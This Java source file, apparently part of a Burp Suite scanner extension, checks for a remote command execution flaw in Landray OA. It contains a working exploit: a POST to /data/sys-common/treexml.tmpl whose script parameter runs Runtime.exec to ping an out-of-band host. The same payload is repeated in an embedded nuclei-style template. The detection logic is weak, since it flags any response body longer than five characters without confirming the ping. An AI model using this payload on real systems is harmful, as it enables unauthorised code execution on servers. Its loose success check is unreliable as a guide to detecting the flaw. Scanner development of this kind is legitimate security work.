package burp.vuls.oa.landray;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.impl.VulTaskImpl;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.List;

public class LandrayOaTreexmlRce extends VulTaskImpl {
    /**
     * 蓝凌oa treecxml.templ命令执行
     *
     * yaml（https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce/blob/main/landray-oa-treexml-rce.yaml）
     * id: landray-oa-treexml-rce
     *
     * info:
     *   name: Landray OA treexml.tmpl Script RCE
     *   severity: high
     *   reference:
     *     - https://github.com/tangxiaofeng7
     *   tags: landray,oa,rce
     *
     * requests:
     *   - method: POST
     *     path:
     *       - '{{BaseURL}}/data/sys-common/treexml.tmpl'
     *
     *     body: |
     *         s_bean=ruleFormulaValidate&script=try {String cmd = "ping {{interactsh-url}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
     *     headers:
     *       Pragma: no-cache
     *       Content-Type: application/x-www-form-urlencoded
     *
     *     matchers:
     *       - type: word
     *         part: interactsh_protocol
     *         name: http
     *         words:
     *           - "dns"
     *           - "http"
     */

    public static VulTaskImpl getInstance(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log){
        return new LandrayOaTreexmlRce(helpers, callbacks, log);
    }
    private LandrayOaTreexmlRce(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log) {
        super(helpers, callbacks, log);
    }

    @Override
    public void run() {
        //新的请求包
        url = iHttpService.getProtocol() + "://" + iHttpService.getHost() + ":" + iHttpService.getPort() + "/data/sys-common/treexml.tmpl";
        // TODO 这里需要burp的一个域名，用于ping
        String poc_body = "s_bean=ruleFormulaValidate&script=try {String cmd = \"ping {{interactsh-url}}\";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}";
        //新请求
        okHttpRequester.send(url, "POST", request_header_list, query, poc_body, contentYtpe, new LandrayOaTreexmlRceCallback(this));
        BurpExtender.vulsChecked.add("burp.vuls.oa.landray.LandrayOaTreexmlRce" + host + iHttpService.getPort()); //添加检测标记
    }
}

class LandrayOaTreexmlRceCallback implements Callback {

    VulTaskImpl vulTask;

    public LandrayOaTreexmlRceCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        vulTask.callbacks.printError("[LandrayOaTreexmlRceCallback-onFailure] " + e.getMessage() + "\n" + vulTask.request_info);
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        if (response.isSuccessful()){
            vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
            // 检查响应体是否有内容
            if (vulTask.ok_respBody.length() > 5) {
                vulTask.message = "LandrayOa-RadeAny";
                vulTask.log(call);
            }
        }
    }
}